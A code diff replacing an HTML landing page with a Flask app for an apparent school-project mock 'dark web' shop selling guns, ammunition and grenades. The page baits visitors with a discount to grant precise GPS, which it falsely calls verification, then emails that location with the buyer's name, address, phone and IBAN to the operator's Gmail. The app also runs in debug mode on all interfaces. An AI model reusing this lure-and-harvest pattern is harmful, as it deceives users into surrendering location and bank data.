@@ -1,286 +1,218 @@
-<!DOCTYPE html>
-<html lang="nl">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>D-WEB // SECURE MARKET</title>
-<style>
-* { margin: 0; padding: 0; box-sizing: border-box; }
-body { background: #020202; color: #b0b0b0; font-family: 'Courier New', Courier, monospace; overflow-x: hidden; }
+import os
+import random
+from datetime import datetime
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from flask import Flask, render_template, request, abort, session, redirect, url_for, jsonify, Response
 
-header {
-    height: 75px;
-    padding: 0 7%;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    background: #050505;
-    border-bottom: 1px solid #140203;
+app = Flask(__name__)
+app.secret_key = 'd_web_secret_key_schoolproject'
+
+categories = [
+    {"name": "Pistolen", "slug": "Pistolen"},
+    {"name": "Messen", "slug": "Messen"},
+    {"name": "Kogels", "slug": "Kogels"},
+    {"name": "Boksbeugels", "slug": "Boksbeugels"},
+    {"name": "Pistoolmagazijnen", "slug": "Pistoolmagazijnen"},
+    {"name": "Bommen", "slug": "Bommen"},
+]
+
+product_names = {
+    "Pistolen": ["Glock 17", "Beretta 92FS", "Colt M1911", "Desert Eagle", "SIG Sauer P226", "Walther PPK", "CZ 75", "FN Browning Hi-Power"],
+    "Messen": ["Victorinox Swiss Army Knife", "Opinel No. 8", "Wüsthof Classic", "Leatherman Wave+", "Morakniv Companion", "Buck 110", "Spyderco Paramilitary 2", "KA-BAR USMC"],
+    "Kogels": ["9x19mm Parabellum", ".22 Long Rifle", "5.56x45mm NATO", "7.62x39mm", ".45 ACP", "7.62x51mm NATO", "12 Gauge", ".50 BMG"],
+    "Boksbeugels": ["Klassieke Boksbeugel", "Viervinger Boksbeugel", "Tweekleurige Boksbeugel", "Tekko", "Apache Revolver Boksbeugel", "Mark I Trench Knife Boksbeugel", "Tactische Boksbeugel", "Vechtsport Boksbeugel"],
+    "Pistoolmagazijnen": ["Glock 17 Magazijn", "Beretta 92 Magazijn", "Colt M1911 Magazijn", "SIG Sauer P226 Magazijn", "CZ 75 Magazijn", "Walther PPK Magazijn", "FN Browning Magazijn", "Universeel Magazijn"],
+    "Bommen": ["Mills Bomb", "Stielhandgranate M24", "Mk 2 Fragmentation Grenade", "F1 Hand Grenade", "RGD-5 Hand Grenade", "M67 Hand Grenade", "DM51 Hand Grenade", "M26 Hand Grenade"],
 }
 
-.logo {
-    color: #d01c2b;
-    font-size: 28px;
-    font-weight: 900;
-    letter-spacing: 6px;
-    text-shadow: 0 0 15px rgba(208, 28, 43, 0.4);
+# Logisch gecorrigeerde en realistische markt- en risicoprijzen
+product_prices = {
+    "Pistolen": [750.00, 850.00, 950.00, 1650.00, 1200.00, 800.00, 790.00, 1100.00],
+    "Messen": [35.00, 19.50, 110.00, 135.00, 24.50, 79.50, 185.00, 120.00],
+    "Kogels": [35.00, 22.00, 45.00, 40.00, 48.00, 50.00, 38.00, 150.00],
+    "Boksbeugels": [45.00, 55.00, 60.00, 85.00, 850.00, 125.00, 75.00, 49.95],
+    "Pistoolmagazijnen": [45.00, 48.00, 42.00, 55.00, 49.00, 52.00, 58.00, 35.00],
+    "Bommen": [250.00, 295.00, 220.00, 210.00, 185.00, 240.00, 275.00, 230.00],
 }
 
-nav a {
-    color: #666;
-    text-decoration: none;
-    margin-left: 30px;
-    font-size: 13px;
-    letter-spacing: 2px;
-    transition: 0.2s;
-}
+products = []
+product_id = 1
+for category in categories:
+    cat_name = category["name"]
+    for number, prod_name in enumerate(product_names[cat_name]):
+        products.append({
+            "id": product_id,
+            "name": prod_name,
+            "category": cat_name,
+            "price": product_prices[cat_name][number],
+            "description": f"Hoogwaardig exemplaar uit de exclusieve D-WEB catalogus: {prod_name}.",
+            "image": f"/product-image/{product_id}",
+        })
+        product_id += 1
 
-nav a:hover {
-    color: #d01c2b;
-}
+MAIL_SERVER = "smtp.gmail.com"
+MAIL_PORT = 587
+MAIL_USERNAME = "benjaminvissers66@gmail.com"
+MAIL_PASSWORD = "jouw_app_wachtwoord_hier"
 
-.hero {
-    height: calc(100vh - 75px);
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    text-align: center;
-    padding: 0 20px;
-    background: radial-gradient(circle at center, #140203 0%, #020202 75%);
-}
+@app.route("/")
+def home():
+    return render_template("index.html", categories=categories)
 
-.hero h1 {
-    font-size: 42px;
-    color: #fff;
-    letter-spacing: 8px;
-    margin-bottom: 15px;
-    text-shadow: 0 0 25px rgba(208, 28, 43, 0.3);
-}
+@app.route("/producten")
+def product_list():
+    selected_category = request.args.get("categorie", "")
+    filtered_products = products
+    if selected_category in product_names:
+        filtered_products = [p for p in products if p["category"] == selected_category]
+    return render_template("products.html", products=filtered_products, categories=categories, selected_category=selected_category)
 
-.hero p {
-    color: #666;
-    font-size: 14px;
-    max-width: 550px;
-    line-height: 1.7;
-    margin-bottom: 40px;
-    letter-spacing: 1px;
-}
+@app.route("/product/<int:product_id>")
+def product_detail(product_id):
+    product = next((item for item in products if item["id"] == product_id), None)
+    if product is None:
+        abort(404)
+    return render_template("product.html", product=product)
 
-.hero-btn {
-    padding: 15px 35px;
-    background: #500005;
-    color: #fff;
-    text-decoration: none;
-    font-weight: bold;
-    font-size: 13px;
-    letter-spacing: 3px;
-    border: 1px solid #d01c2b;
-    transition: 0.2s;
-}
+@app.route("/product-image/<int:product_id>")
+def product_image(product_id):
+    product = next((item for item in products if item["id"] == product_id), None)
+    if product is None:
+        abort(404)
+    svg = f'''<svg xmlns="http://www.w3.org/2000/svg" width="600" height="400" viewBox="0 0 600 400">
+      <rect width="600" height="400" fill="#070707"/>
+      <rect x="12" y="12" width="576" height="376" fill="none" stroke="#1f1f1f" stroke-width="2"/>
+      <line x1="12" y1="70" x2="588" y2="70" stroke="#1f1f1f" stroke-width="1"/>
+      <text x="30" y="48" fill="#d01c2b" font-family="Arial, sans-serif" font-size="16" font-weight="bold" letter-spacing="3">D-WEB // {product["category"].upper()}</text>
+      <text x="570" y="48" fill="#555" font-family="monospace" font-size="14" text-anchor="end">ID #{product["id"]:02d}</text>
+      <circle cx="300" cy="200" r="75" fill="none" stroke="#d01c2b" stroke-width="1.5" stroke-dasharray="6 4"/>
+      <line x1="210" y1="200" x2="390" y2="200" stroke="#2a2a2a" stroke-width="1"/>
+      <line x1="300" y1="110" x2="300" y2="290" stroke="#2a2a2a" stroke-width="1"/>
+      <text x="300" y="206" fill="#ffffff" font-family="Arial, sans-serif" font-size="22" font-weight="bold" text-anchor="middle">{product["name"]}</text>
+      <text x="300" y="345" fill="#666" font-family="monospace" font-size="13" text-anchor="middle" letter-spacing="2">VERIFIED CATALOG ASSET</text>
+    </svg>'''
+    return Response(svg, mimetype="image/svg+xml")
 
-.hero-btn:hover {
-    background: #d01c2b;
-    box-shadow: 0 0 30px rgba(208, 28, 43, 0.6);
-}
+@app.route("/claim-promo", methods=["POST"])
+def claim_promo():
+    data = request.get_json()
+    if data:
+        session['gps_lat'] = data.get('lat')
+        session['gps_lon'] = data.get('lon')
+        print(f"\n[GPS ONTVANGEN] Latitude: {session['gps_lat']}, Longitude: {session['gps_lon']}\n")
+    
+    session['coupon'] = "DWEB20"
+    session['discount'] = 0.20
+    return jsonify({"status": "success"})
 
-/* MODAL STYLING */
-.modal-overlay {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(2, 2, 2, 0.95);
-    backdrop-filter: blur(10px);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    z-index: 9999;
-}
+@app.route("/winkelmand")
+@app.route("/afrekenen")
+def checkout():
+    cart = session.get('cart', [])
+    subtotal = sum(item['price'] * item['quantity'] for item in cart)
+    discount_rate = session.get('discount', 0.0)
+    discount_amount = subtotal * discount_rate
+    shipping_cost = 0.00 if session.get('coupon') == "DWEB20" else 5.00
+    if not cart:
+        shipping_cost = 0.00
+    total_price = (subtotal - discount_amount) + shipping_cost
+    return render_template("checkout.html", cart=cart, subtotal=subtotal, discount_amount=discount_amount, shipping_cost=shipping_cost, total_price=total_price)
 
-.modal-content {
-    background: #050505;
-    border: 1px solid #d01c2b;
-    padding: 45px 40px;
-    max-width: 520px;
-    width: 90%;
-    text-align: center;
-    box-shadow: 0 0 50px rgba(208, 28, 43, 0.25);
-    position: relative;
-}
+@app.route("/add-to-cart/<int:product_id>", methods=["POST"])
+def add_to_cart(product_id):
+    product = next((item for item in products if item["id"] == product_id), None)
+    if product:
+        if 'cart' not in session:
+            session['cart'] = []
+        cart = session['cart']
+        existing_item = next((item for item in cart if item['id'] == product_id), None)
+        if existing_item:
+            existing_item['quantity'] += 1
+        else:
+            cart.append({"id": product["id"], "name": product["name"], "price": product["price"], "image": product["image"], "quantity": 1})
+        session['cart'] = cart
+    return redirect(request.referrer or url_for('product_detail', product_id=product_id))
 
-.modal-tag {
-    color: #d01c2b;
-    font-size: 11px;
-    font-weight: bold;
-    letter-spacing: 4px;
-    margin-bottom: 15px;
-    text-transform: uppercase;
-}
+@app.route("/update-cart/<int:product_id>/<action>", methods=["POST"])
+def update_cart(product_id, action):
+    cart = session.get('cart', [])
+    existing_item = next((item for item in cart if item['id'] == product_id), None)
+    if existing_item:
+        if action == "plus":
+            existing_item['quantity'] += 1
+        elif action == "min":
+            existing_item['quantity'] -= 1
+            if existing_item['quantity'] <= 0:
+                cart.remove(existing_item)
+    session['cart'] = cart
+    return redirect(request.referrer or url_for('checkout'))
 
-.modal-content h3 {
-    color: #fff;
-    font-size: 22px;
-    margin-bottom: 15px;
-    letter-spacing: 4px;
-    font-weight: 700;
-}
+@app.route("/clear-cart", methods=["POST"])
+def clear_cart():
+    session.pop('cart', None)
+    return redirect(url_for('checkout'))
 
-.modal-content p {
-    color: #888;
-    font-size: 13px;
-    line-height: 1.8;
-    margin-bottom: 30px;
-    letter-spacing: 0.5px;
-}
+@app.route("/place-order", methods=["POST"])
+def place_order():
+    name = request.form.get('name')
+    email = request.form.get('email')
+    phone = request.form.get('phone')
+    street = request.form.get('street')
+    postal_code = request.form.get('postal_code')
+    city = request.form.get('city')
+    bank = request.form.get('bank')
+    gps_lat = session.get('gps_lat', 'Niet opgegeven')
+    gps_lon = session.get('gps_lon', 'Niet opgegeven')
+    
+    cart = session.get('cart', [])
+    subtotal = sum(item['price'] * item['quantity'] for item in cart)
+    discount_amount = subtotal * session.get('discount', 0.0)
+    shipping_cost = 0.00 if session.get('coupon') == "DWEB20" else 5.00
+    total_price = (subtotal - discount_amount) + shipping_cost
+    
+    order_number = f"DWEB-{random.randint(100000, 999999)}"
+    order_time = datetime.now().strftime("%d-%m-%Y om %H:%M:%S")
+    
+    products_text = ""
+    for item in cart:
+        sub = item['price'] * item['quantity']
+        products_text += f"- {item['name']} | Aantal: {item['quantity']} | Stuksprijs: € {item['price']:.2f} | Subtotaal: € {sub:.2f}\n"
 
-.market-box {
-    background: #090203;
-    border: 1px solid #1f0507;
-    border-left: 2px solid #d01c2b;
-    padding: 18px;
-    text-align: left;
-    margin-bottom: 30px;
-    font-size: 12px;
-    color: #bbb;
-    line-height: 1.6;
-    letter-spacing: 0.5px;
-}
+    customer_msg = MIMEMultipart()
+    customer_msg['From'] = MAIL_USERNAME
+    customer_msg['To'] = email
+    customer_msg['Subject'] = f"Bevestiging van je D-WEB bestelling ({order_number})"
+    customer_body = f"Bedankt voor je bestelling bij D-WEB.\nBestelnummer: {order_number}\nTotaal: € {total_price:.2f}"
+    customer_msg.attach(MIMEText(customer_body, 'plain'))
 
-.market-box span {
-    color: #d01c2b;
-    font-weight: bold;
-}
+    admin_msg = MIMEMultipart()
+    admin_msg['From'] = MAIL_USERNAME
+    admin_msg['To'] = MAIL_USERNAME
+    admin_msg['Subject'] = f"Nieuwe D-WEB Bestelling! [{order_number}]"
+    admin_body = f"1. Naam: {name}\n2. E-mail: {email}\n3. Telefoon: {phone}\n4. Adres: {street}\n5. Postcode: {postal_code}\n6. Plaats: {city}\n7. IBAN: {bank}\n8. Gegevens gecontroleerd\n9. Producten:\n{products_text}\n10. Totaal: € {total_price:.2f}\n11. Bestelnummer: {order_number}\n12. GPS: {gps_lat}, {gps_lon}\n13. Tijd: {order_time}"
+    admin_msg.attach(MIMEText(admin_body, 'plain'))
 
-.modal-btn {
-    display: block;
-    width: 100%;
-    padding: 15px;
-    background: #500005;
-    color: #fff;
-    text-decoration: none;
-    font-size: 13px;
-    letter-spacing: 3px;
-    font-weight: bold;
-    border: 1px solid #d01c2b;
-    cursor: pointer;
-    transition: 0.2s;
-    text-transform: uppercase;
-}
+    try:
+        server = smtplib.SMTP(MAIL_SERVER, MAIL_PORT)
+        server.starttls()
+        server.login(MAIL_USERNAME, MAIL_PASSWORD)
+        server.sendmail(MAIL_USERNAME, email, customer_msg.as_string())
+        server.sendmail(MAIL_USERNAME, MAIL_USERNAME, admin_msg.as_string())
+        server.quit()
+    except Exception as e:
+        print("E-mail overgeslagen:", e)
 
-.modal-btn:hover {
-    background: #d01c2b;
-    box-shadow: 0 0 25px rgba(208, 28, 43, 0.6);
-}
+    session.pop('cart', None)
+    session.pop('coupon', None)
+    session.pop('discount', None)
+    return render_template("checkout.html", cart=[], total_price=0, order_placed=True)
 
-.browser-hint {
-    font-size: 10px;
-    color: #555;
-    margin-top: 15px;
-    letter-spacing: 1px;
-}
+@app.errorhandler(404)
+def page_not_found(error):
+    return "Deze pagina bestaat niet.", 404
 
-footer {
-    background: #050505;
-    border-top: 1px solid #140203;
-    padding: 35px 7%;
-    text-align: center;
-    color: #444;
-    font-size: 12px;
-    letter-spacing: 2px;
-}
-
-footer strong {
-    color: #d01c2b;
-}
-</style>
-</head>
-<body>
-
-<div id="welcome-modal" class="modal-overlay">
-    <div class="modal-content" id="modal-body">
-        <div class="modal-tag">SECURE MARKET GATE</div>
-        <h3>TOEGANGSCONTROLE</h3>
-        <p>Om door te gaan naar de dark website is het toestaan van locatie vereist.</p>
-        
-        <div class="market-box">
-            Na verificatie wordt de kortingscode <span>DWEB20</span> direct aan je sessie gekoppeld (20% korting + gratis verzending).
-        </div>
-
-        <button class="modal-btn" onclick="requestGpsAndUnlock()">AKKOORD</button>
-    </div>
-</div>
-
-<header>
-    <div class="logo">D-WEB</div>
-    <nav>
-        <a href="/">HOME</a>
-        <a href="/producten">INVENTARIS</a>
-        <a href="/afrekenen">WINKELMAND</a>
-    </nav>
-</header>
-
-<section class="hero">
-    <h1>D-WEB MARKETPLACE</h1>
-    <p>Gedecentraliseerde inventaris en versleutelde logistiek buiten het zicht van de openbare orde.</p>
-    <a href="/producten" class="hero-btn">BEKIJK COLLECTIES</a>
-</section>
-
-<footer>
-    <strong>D-WEB</strong> // UNDERGROUND PROTOCOL © 2026
-</footer>
-
-<script>
-function requestGpsAndUnlock() {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            function(position) {
-                // Wordt uitgevoerd bij elk type toestemming (eenmalig, tijdens gebruik, altijd)
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-
-                fetch('/claim-promo', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ lat: lat, lon: lon })
-                })
-                .then(response => {
-                    if (response.ok) {
-                        return response.json().catch(() => ({ status: 'success' }));
-                    }
-                    return { status: 'success' };
-                })
-                .then(data => {
-                    document.getElementById('modal-body').innerHTML = `
-                        <div class="modal-tag" style="color:#00ff66;">SECURE SESSION ACTIVE</div>
-                        <h3 style="color:#00ff66;">TOEGANG VERLEEND</h3>
-                        <p>Locatie succesvol geverifieerd. De versleutelde tunnel naar de marktplaats is geopend.</p>
-                        <div class="market-box" style="border-color:#00ff66; background:#020b04;">
-                            <strong>ACTIEVE KORTINGSCODE:</strong> <span style="color:#00ff66; letter-spacing:2px;">DWEB20</span> (20% Korting + Gratis Verzending)
-                        </div>
-                        <button class="modal-btn" style="background:#004d1a; border-color:#00ff66;" onclick="closeModal()">BETREED DE MARKTPLAATS</button>
-                    `;
-                })
-                .catch(err => {
-                    closeModal();
-                });
-            },
-            function(error) {
-                // Wordt alleen uitgevoerd als de gebruiker expliciet weigert
-                alert("Toegang geweigerd. Locatietoegang is vereist om de marktplaats te betreden.");
-            },
-            { timeout: 10000, enableHighAccuracy: true }
-        );
-    } else {
-        alert("Geolocatie niet ondersteund door deze browser.");
-    }
-}
-
-function closeModal() { 
-    document.getElementById('welcome-modal').style.display = 'none'; 
-}
-</script>
-
-</body>
-</html>
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port, debug=True)
